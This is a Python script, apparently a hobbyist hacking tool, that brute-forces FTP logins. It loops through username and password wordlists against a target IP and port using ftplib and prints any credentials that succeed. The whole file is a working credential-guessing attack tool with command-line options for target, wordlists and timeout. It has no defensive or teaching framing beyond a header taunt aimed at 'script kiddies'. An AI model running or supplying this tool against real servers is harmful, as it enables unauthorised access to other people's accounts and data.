'''

	Script Kiddie, learn this script and modify with Your own style.
	Do not Paste and Copy it.
	Changing the Variabel and the Author Name didn't make You be a Programmer 
	
'''
import ftplib
import os
import sys
import random
import time
import argparse
import socket
W='\33[0m'
R='\33[1;31m'
G='\033[1;32m'
O='\33[1;33m'
B='\33[1;34m'
P='\33[1;35m'
C='\33[1;36m'
GR='\33[1;37m'
WL="\033[0;37m"
dd=f"{W}[{G} +{W} ] "
st=f"{W}[{P} * {W}] "
er=f"{W}[{R} ! {W}] "
userlist=[]
x=0
def files(user,pw):
	try:
		file=open(user,'r').readlines()
		file2=open(pw,'r').readlines()
		for a in file:
			a=a.strip()
			userlist.append(a)
	except:
		print(er+"files is not found ")
		sys.exit()
def br():
	userlist.clear()
	
	
def ulogin(host,port,user,pw,tm):
	kk=0
	files(user,pw)
	file=open(user,'r').readlines()
	file2=open(pw,'r').readlines()
	for i in userlist:
		kk+=1
		i=i.strip()
		mp=str(kk)
		for p in file2:
			p=p.strip()
			try:
				target=str(host)
				target=target.strip()
				fb=ftplib.FTP()
				fb.connect(target,port,timeout=tm)
				fb.login(i,p)
				fb.quit()
				print(st+'connection to: '+target+':'+str(port))         
				print(dd+"username: "+G+i)
				print(dd+"password: "+G+p)
				print(W)
				br()
				break
				sys.exit(0)
				sys.exit(1)
			except KeyboardInterrupt:
				br()
				break
				sys.exit()
			except ftplib.error_perm:
				print(er+"try :username: "+i+"  :password: "+p)
			except ConnectionRefusedError:
				print(er+"Port Connect Error")
				br()
				sys.exit()
			except OSError:
				print(er+'Target ip is not found ')
				br()
				sys.exit()
			except:
				print(er+"Error")
				br()
				sys.exit()
def start():
	parse=argparse.ArgumentParser(description="coding bay issam iso\nIf there is a problem contact me \nhttps://www.facebook.com/issamiso4\n")
	parse.add_argument('--userlist',dest="usernamelist",help='username list')
	parse.add_argument('--passlist',dest='passwordlist',help='password list')
	parse.add_argument('--target',dest="host",help='target ip address')
	parse.add_argument('--port',dest='port',help='target port default 21',type=int)
	parse.add_argument('--timeout',dest='tt',help='timeout connect',type=int)
	arg=parse.parse_args()
	if arg.host:
		host=arg.host
		if arg.port:
			port=arg.port
		if arg.usernamelist:
			user=arg.usernamelist
		if arg.passwordlist:
			pass_=arg.passwordlist
		if arg.tt:
			tt=arg.tt
		if not arg.usernamelist:
			print(st+'auto get file username.txt')
			user='username.txt'
		if not arg.passwordlist:
			print(st+'auto get file password.txt')
			pass_="password.txt"
		if not arg.port:
			print(st+'auto port 21')
			port=21
		if not arg.tt:
			print(st+'auto timeout 2')
			tt=2
		try:		
			ulogin(host,port,user,pass_,tt)
		except KeyboardInterrupt:
			sys.exit()
		except:
			print(er+'Error')
			sys.exit()

if __name__ == "__main__":
	try:		
		start()
	except:
		sys.exit()
		
# Coded Bay issam iso 
# If there is a problem contact me 
# https://www.facebook.com/issamiso4	
		
		
		
		